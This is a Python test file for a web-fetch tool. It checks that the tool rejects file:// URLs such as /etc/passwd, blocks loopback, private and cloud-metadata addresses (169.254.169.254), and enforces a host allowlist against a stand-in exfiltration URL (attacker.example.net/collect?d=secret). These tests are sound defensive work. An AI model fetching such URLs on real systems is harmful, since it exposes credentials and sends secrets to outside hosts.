from __future__ import annotations

from infrastructure.tools.web_fetch_tool import WebFetchTool


def test_rejects_non_http_schemes():
    out = WebFetchTool().invoke({"url": "file:///etc/passwd"})
    assert "http and https" in out


def test_blocks_loopback_and_link_local_and_private():
    tool = WebFetchTool()
    for url in (
        "http://127.0.0.1:8000/",
        "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",  # cloud metadata
        "http://10.0.0.5/",
        "http://192.168.1.1/",
    ):
        out = tool.invoke({"url": url})
        assert "Error" in out
        assert "internal" in out.lower() or "disallowed" in out.lower() \
            or "resolve" in out.lower()


def test_allowlist_blocks_other_hosts_before_any_network(monkeypatch):
    monkeypatch.setenv("HYPERIUM_WEB_FETCH_ALLOW", "example.com")
    out = WebFetchTool().invoke({"url": "http://attacker.example.net/collect?d=secret"})
    assert "allowlist" in out


def test_a_url_with_no_host_is_rejected():
    assert "host" in WebFetchTool().invoke({"url": "http://"})
